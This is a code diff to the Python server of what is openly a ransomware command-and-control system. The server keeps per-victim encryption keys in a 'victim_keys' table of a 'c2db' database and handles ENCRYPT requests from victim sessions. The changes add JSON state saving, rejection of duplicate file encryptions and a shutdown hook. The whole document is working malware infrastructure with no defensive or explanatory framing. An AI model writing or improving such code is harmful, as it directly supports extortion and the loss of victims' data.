@@ -1,3 +1,4 @@
+import atexit
 import base64
 import cmd
 from collections import deque
@@ -8,7 +9,7 @@ import secrets
 import shlex
 import socket
 import threading
-from typing import Deque, Dict, Optional, Tuple, Union
+from typing import Deque, Dict, Optional, Set, Tuple, Union
 import crypto
 import psycopg
 
@@ -23,7 +24,8 @@ class QueuedTCPSessionServer:
         port,
         macros_path,
         postgres_dsn,
-        postgres_table
+        postgres_table,
+        state_path
     ) -> None:
         self.bind_ip = bind_ip
         self.port = port
@@ -31,10 +33,15 @@ class QueuedTCPSessionServer:
         self.macros: Dict[str, str] = self._load_macros()
         self.postgres_dsn = postgres_dsn
         self.postgres_table = postgres_table
+        self.state_path = state_path
 
+        # Crypto secrets - regenerate per iteration
         self.global_key1 = secrets.randbits(20)
         self.global_key2 = secrets.randbits(20)
+        # ip -> victim_key
         self.per_victim_key_store = {}
+        # Prevent encrypting the same file twice
+        self.encrypted_names: Set[Tuple[str, str]] = set()
 
         self.server_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         self.server_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
@@ -53,6 +60,7 @@ class QueuedTCPSessionServer:
         self.next_id = 1
         self.running = threading.Event()
         self.running.set()
+        self.load_from_json()
 
     def _load_macros(self) -> Dict[str, str]:
         if not self.macros_path.exists():
@@ -306,12 +314,19 @@ class QueuedTCPSessionServer:
                                 src_path_bytes = b"input.bin"
                                 src_path = "input.bin"
 
+                            if (session_ip, src_path) in self.encrypted_names:
+                                self._send_line(conn, "REJECTED")
+                                print(
+                                    f"\n[Session #{assigned_sid}] rejected duplicate ENCRYPT for '{src_path}'")
+                                continue
+
                             enc_bytes = self._encrypt_bytes(
                                 raw_bytes, session_ip, src_path_bytes)
                             print(
                                 f"\n[Session #{assigned_sid}] ENCRYPT request for '{src_path}' ({length} bytes)"
                             )
                             self._save_encrypted_copy(session_ip, src_path, enc_bytes)
+                            self.encrypted_names.add((session_ip, src_path))
                             if self._send_encrypted(conn, enc_bytes):
                                 print(
                                     f"[Sent encrypted data to Session #{assigned_sid}] ({len(enc_bytes)} bytes)")
@@ -545,6 +560,7 @@ class QueuedTCPSessionServer:
         self.shutdown()
 
     def shutdown(self) -> None:
+        self.save_to_json()
         self.running.clear()
         try:
             self.server_sock.close()
@@ -575,6 +591,23 @@ class QueuedTCPSessionServer:
                     (origin_ip, str(victim_key)))
         except Exception as exc:
             print(f"Failed to store victim key for {origin_ip}: {exc}")
+
+    def load_from_json(self) -> None:
+        try:
+            with open(self.state_path) as f:
+                state = json.load(f)
+        except (OSError, json.JSONDecodeError):
+            return
+        self.encrypted_names = {
+            tuple(p) for p in state.get("encrypted_names", [])}
+        print("Successfully loaded state from JSON.")
+
+    def save_to_json(self) -> None:
+        state = {
+            "encrypted_names": [list(p) for p in self.encrypted_names],
+        }
+        with open(self.state_path, "w") as f:
+            json.dump(state, f)
 
     def _encrypt_bytes(self, data: bytes, origin_ip: str, path: bytes) -> bytes:
         with self.lock:
@@ -607,9 +640,11 @@ if __name__ == "__main__":
         port=9000,
         macros_path="macros.json",
         postgres_dsn="dbname=c2db host=/var/run/postgresql",
-        postgres_table="victim_keys")
+        postgres_table="victim_keys",
+        state_path="state.json")
     acceptor = threading.Thread(target=server.accept_loop, daemon=True)
     acceptor.start()
+    atexit.register(server.shutdown)
     if os.environ.get("C2_HEADLESS"):
         threading.Event().wait()
     else:
